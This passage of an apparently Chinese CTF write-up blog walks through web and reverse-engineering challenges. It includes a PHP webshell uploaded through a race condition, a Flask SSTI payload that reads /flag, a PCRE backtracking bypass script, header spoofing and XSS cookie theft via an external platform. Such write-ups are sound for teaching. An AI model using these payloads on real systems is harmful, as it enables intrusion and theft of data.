class="keyword">isset</span>($input)) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (substr($input, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;vme50&quot;</span> <span class="keyword">and</span> substr($input, <span class="number">-1</span>, <span class="number">1</span>) == <span class="string">&quot;!&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> ($input == <span class="string">&quot;vme50!&quot;</span>) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Speak a little louder, I can&#x27;t hear you!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/vme50.+?!/is&#x27;</span>, $input)) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xing bu xing a.Speak much louder!&quot;</span>);  </span><br><span class="line">        &#125;        system(<span class="string">&quot;cat /flag&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Bie lai zhan bian!!!&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对传入的a参数有三个条件</p><ol><li><p>以<code>vme50</code>为开头，以感叹号为末尾</p></li><li><p>不可以是<code>vme50</code></p></li><li><p>不可以满足正则表达式<code>/vme50.+?!/is</code>，该正则表达式的意思是匹配以<code>vme50</code>开头，以感叹号为末尾，且数字0后面有若干个零的字符串，一旦匹配到就算失败</p></li><li><p><code>/</code>：正则表达式的开始和结束标记。</p></li><li><p><code>vme50</code>：字面意义上的字符串 “vme50”，表示匹配文本中包含 “vme50” 的部分。</p></li><li><p><code>.</code>：点号（<code>.</code>）在正则表达式中是一个特殊字符，表示匹配任意单个字符（除了换行符）。</p></li><li><p><code>+</code>：加号（<code>+</code>）表示前面的字符（在这个例子中是点号 <code>.</code>）出现一次或多次。</p></li><li><p><code>?</code>：问号（<code>?</code>）在这里与 <code>+</code> 结合使用，表示前面的字符（点号 <code>.</code>）出现一次或多次，但尽可能少地匹配，这是一种非贪婪匹配。</p></li><li><p><code>!</code>：感叹号（<code>!</code>）在这里是一个普通字符，表示匹配文本中包含 <code>!</code> 的部分。</p></li><li><p><code>/is</code>：这是正则表达式的修饰符部分，<code>i</code> 表示不区分大小写，<code>s</code> 表示点号 <code>.</code> 可以匹配任意字符，包括换行符。</p></li></ol><p>仔细观察就会发现条件2和条件3冲突了，因此绕不过preg_match<br>但是函数preg_match存在一个限制，就是匹配的次数，超过一定次数的匹配会直接返回FALSE，这个限制一般是100万<br>所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="comment">#&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;vme50&#x27;</span>+<span class="string">&#x27;0&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><code>flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125;</code></p><h2 id="KFC"><a href="#KFC" class="headerlink" title="KFC"></a>KFC</h2><blockquote><p> 主要考点：HTTP header各字段的含义及格式</p></blockquote><p>进入题目连接，除了一张无意义的图片之外就是<code>Are you come from localhost?</code><br>猜测修改XFF，即<code>X-Forwarded-For: 127.0.0.1</code></p><p>发包返回<code>Are you jump from KFC&#39;s website?(http:****.cn)</code><br>猜测修改Referer，搜索kfc的网址<code>https://kfcapp.cn/</code>，即<code>Referer: https://kfcapp.cn/</code></p><p>发包返回<code>Have you v me 50?</code><br>这下不懂了，但是仔细观察发现返回的包中header多了一个money的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sat, 26 Oct 2024 17:57:44 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45</span><br><span class="line">X-Powered-By: PHP&#x2F;5.4.45</span><br><span class="line">money: 0</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 106</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50?</span><br></pre></td></tr></table></figure><p>故猜测在header增加一个money的字段，值为50，即<code>money: 50</code></p><p><code>flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; </code></p><h2 id="kk园区审核员"><a href="#kk园区审核员" class="headerlink" title="kk园区审核员"></a>kk园区审核员</h2><p><code>善良的出题人组织了一次kk园区的参观活动，现在收集有意向前往的人员信息，提交后工作人员会第一时间审核哦，审核通过还能得到审核的美味曲奇奖励！</code></p><p>填表 - 提交 - 审核cookie<br>猜测是xss cookie外带</p><ul><li>找xss平台</li><li>复制payload并填表</li><li>提交并返回xss平台看记录</li></ul><p><a href="https://xssaq.com/login/">XSS平台-XSS测试网站-仅用于安全免费测试 (xssaq.com)</a></p><h2 id="reallyExpensive"><a href="#reallyExpensive" class="headerlink" title="reallyExpensive"></a>reallyExpensive</h2><p><img src="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145214.png"><br>给了十块钱的余额要买好贵的flag<br>抓包改购买的数目<br><img src="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145318.png"></p><p><code>flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125;</code></p><h2 id="upload-quick"><a href="#upload-quick" class="headerlink" title="upload_quick"></a>upload_quick</h2><p>进入页面什么也干不了，没有找到文件上传的路径<br>文件上传的页面藏在js文件里</p><p>根据题目猜测条件竞争</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1</span><br><span class="line">Host: 43.248.97.213:30014</span><br><span class="line">Content-Length: 331</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0</span><br><span class="line">Origin: http:&#x2F;&#x2F;43.248.97.213:30014</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</span><br><span class="line">Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;</span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重复发包的同时访问这个页面，生成shell.php，然后远程连接就可以了</p><p><code>flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125;</code></p><h2 id="你买车票没"><a href="#你买车票没" class="headerlink" title="你买车票没"></a>你买车票没</h2><p>题目是一个登录框，需要输入账号密码，但是好像不是sql注入（因为测不出来）<br>每次提交都会弹窗<code>xxx,没买车票不能上车!!!</code><br>但是在返回的页面中并没有看到js代码或者请求的js文件<br><img src="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215016.png"></p><p>一开始以为是使用php动态生成的js代码，但是没有思路<br>后面经过摸索发现是ssti模板注入，因为每次输入的用户名都会回显，所以可以使用<code>&#123;&#123; 4-1 &#125;&#125;</code>这样的输入测试，如果返回3就说明存在ssti模板注入<br><img src="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215101.png"></p><p>确定了存在模板注入之后，还要确定怎么写payload<br><a href="https://xz.aliyun.com/t/3679?time__1311=n4+xnii=oGqmqDK0QDODlx6e0=bYhq3+hS+iD">flask之ssti模版注入从零到入门 - 先知社区 (aliyun.com)</a></p><p>payload有很多种，一般是从字符串或者列表出发，向上找基类，然后从基类往下找可以读取文件的函数<br>这里使用的payload：<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,"/flag")&#125;&#125;</code></p><p>一般到subclasses之后就需要手动找目标函数，然后传入需要读的文件的路径，这里找到的是<code>FileLoader</code><br><img src="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215137.png"></p><p><code>XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125;</code></p><h2 id="隐秘的backdoor"><a href="#隐秘的backdoor" class="headerlink" title="隐秘的backdoor"></a>隐秘的backdoor</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">$cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;    phpinfo();  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;不要这样！TuT&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line">    <span class="keyword">eval</span>($cmd);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查询了很多绕过的方式，还是不行<br>然后看了看php的版本，查到了这个版本的漏洞</p><p><img src="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026174307.png"></p><p>具体上网搜</p><p><code>flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125;</code></p><h2 id="calculate"><a href="#calculate" class="headerlink" title="calculate"></a>calculate</h2><p>查壳，发现upx，<code>upx.exe -d calculate.exe</code><br>然后扔进ida，发现这么一个函数<br><img src="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" srcset="data:image/png;base64,666" alt="Pasted image 20241025211214.png"></p><p>百度下叫约束求解（看起来有点像矩阵运算）<br>1000多行手工提取不实际，写个脚本处理下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;asd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">final = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;return 0i64;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">        tmp += i.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        final.append(tmp)</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">print(final)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> final:</span><br><span class="line">        f.write(i+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>初步处理之后手动删去前后缀，就得到了公式（字符串版）</p><p>然后使用python中一个叫z3的库，专门用来求解这种方程组<br>其中有一个方法可以将字符串版的方程转换为python可以处理的表达式</p><p>以下是一个模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    <span class="comment"># 创建解释器对象</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="comment"># 添加约束方程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i])) <span class="comment">#eval函数会将字符串形式的方程转换为z3模块能解析的方程</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 求解并转化为字符输出，得到flag</span></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:  <span class="comment"># check()方法用来判断是否有解，sat(即satisify)表示满足有解</span></span><br><span class="line">        ans = solver.model()  <span class="comment"># model()方法得到解</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 一般不会无解，如果无解八成是未知数变量的类型不符合，或约束方程添加错误</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;no ans!&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 设置方程，请用脚本将条件中的所有方程处理成列表，然后赋值给fc列表（这样你就不用一个一个方程慢慢去复制了）</span></span><br><span class="line">    fc = []</span><br><span class="line">    <span class="comment"># 创建未知数变量</span></span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line"> </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p>根据题目修改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        ans = solver.model()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        fc.append(i.strip())</span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line">    </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p><code>flag&#123;n0w_y0u_know_UPX!&#125;</code></p><p><a href="https://blog.csdn.net/liKeQing1027520/article/details/138047537">z3求解器脚本（CTF-reverse必备）_ctf z3-CSDN博客</a></p><h2 id="call-above-call"><a href="#call-above-call" class="headerlink" title="call_above_call"></a>call_above_call</h2><p>核心代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// bad sp value at call has been detected, the output may be wrong!</span><br><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp<span class="number">-14</span>h] [ebp<span class="number">-90</span>h]</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp<span class="number">-10</span>h] [ebp<span class="number">-8</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp-Ch] [ebp<span class="number">-88</span>h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp<span class="number">-8</span>h] [ebp<span class="number">-84</span>h]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp<span class="number">-4</span>h] [ebp<span class="number">-80</span>h]</span><br><span class="line">  <span class="built_in">int</span> v9; // [esp+<span class="number">0</span>h] [ebp<span class="number">-7</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v10; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> v12; // [esp+<span class="number">8</span>h] [ebp<span class="number">-74</span>h]</span><br><span class="line">  char s[<span class="number">100</span>]; // [esp+Ch] [ebp<span class="number">-70</span>h] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v14; // [esp+<span class="number">70</span>h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> *p_argc; // [esp+<span class="number">74</span>h] [ebp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v12 = generate();</span><br><span class="line">  printf(<span class="string">&quot;input your key:&quot;</span>);</span><br><span class="line">  ((void (__stdcall *)(const char *, char *, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>))__isoc99_scanf)(</span><br><span class="line">    <span class="string">&quot;%s&quot;</span>,</span><br><span class="line">    s,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v8,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    v10,</span><br><span class="line">    v12);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(s) != <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;Sorry!&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wuhuwuhu((<span class="built_in">int</span>)s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != *(_BYTE *)(enc + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    printf(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    printf(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">  end_m(p_argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl wuhuwuhu(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">8</span>h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + <span class="number">1</span> + a1);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要逻辑：接收输入然后循环异或输入（元素1和元素2异或的结果替换元素1），然后和目标数组比较，但是目标数组是动态的，因此需要动态调试<br>拿到目标数组后反过来异或就可以了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x17</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x1D</span>, <span class="number">0x17</span>, <span class="number">0x52</span>, <span class="number">0x5C</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] = s[<span class="built_in">len</span>(s)<span class="number">-2</span>-i] ^ s[<span class="built_in">len</span>(s)<span class="number">-1</span>-i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;0yn4mic_d3bug_yyds!&#125;</code></p><h2 id="cube3"><a href="#cube3" class="headerlink" title="cube3"></a>cube3</h2><p>题目描述</p><ol><li>你玩过三阶魔方吗,你能看懂R U R’ U’这样的公式吗,这里有4个魔方等你来还原</li><li>公式(步骤)格式例如R U’ R U R U R U’ R’ U’ R2’ 